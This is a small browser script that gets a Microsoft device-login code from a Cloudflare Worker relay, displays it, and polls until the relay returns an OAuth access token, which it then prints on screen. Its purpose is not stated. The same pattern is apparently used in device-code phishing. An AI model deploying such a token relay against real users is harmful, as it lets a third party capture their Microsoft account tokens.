const WORKER_URL = "https://msft-bridge.brightmccain.workers.dev/";

async function init() {
    const codeEl = document.getElementById('user-code');
    const statusEl = document.getElementById('status');
    const outputEl = document.getElementById('terminal-output');

    statusEl.innerText = "Attempting to reach Cloudflare...";

    try {
        const response = await fetch(WORKER_URL);
        const data = await response.json();

        if (data.user_code) {
            codeEl.innerText = data.user_code;
            codeEl.style.color = "#ffffff";
            statusEl.innerText = "Awaiting Microsoft Auth...";
            poll(data.device_code);
        } else {
            // Display Microsoft's error directly on screen
            document.body.style.background = "#330000";
            statusEl.innerText = "MICROSOFT REJECTED REQUEST";
            outputEl.innerText = JSON.stringify(data, null, 2);
        }
    } catch (e) {
        document.body.style.background = "#330000";
        statusEl.innerText = "NETWORK BLOCK DETECTED";
        outputEl.innerText = "Cannot reach Cloudflare. Error: " + e.message;
    }
}

async function poll(deviceCode) {
    const outputEl = document.getElementById('terminal-output');
    const statusEl = document.getElementById('status');
    
    setInterval(async () => {
        try {
            const res = await fetch(`${WORKER_URL}?check=${deviceCode}`);
            const data = await res.json();
            if (data.access_token) {
                statusEl.innerText = "HANDSHAKE COMPLETE";
                outputEl.innerText = JSON.stringify(data, null, 2);
            }
        } catch (e) {}
    }, 5000);
}

init();
